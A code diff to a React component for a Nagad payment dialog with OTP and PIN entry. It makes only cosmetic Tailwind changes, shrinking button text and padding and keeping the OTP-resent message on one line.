@@ -192,7 +192,7 @@ const NagadPayment = () => {
                   className="w-4/5 h-10 bg-white rounded text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
                 />
                 {otpResent && (
-                  <p className="text-[#ccc] text-sm font-bold mt-3">{t.otpResent}</p>
+                  <p className="text-[#ccc] text-[10px] font-bold mt-3 whitespace-nowrap">{t.otpResent}</p>
                 )}
               </div>
             ) : (
@@ -217,15 +217,15 @@ const NagadPayment = () => {
           <div className="flex gap-8 justify-center shrink-0">
             <button
               onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-              className="px-7 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+              className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
             >{t.proceed}</button>
             {showOtpView && (
               <button onClick={handleResendOtp}
-                className="px-5 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+                className="px-4 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
               >{t.resendCode}</button>
             )}
             <button onClick={handleClose}
-              className="px-7 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
+              className="px-6 bg-white text-[#C41E3A] py-1 rounded text-[10px] font-extrabold transition-colors hover:bg-transparent hover:text-white border border-white"
             >{t.close}</button>
           </div>
 
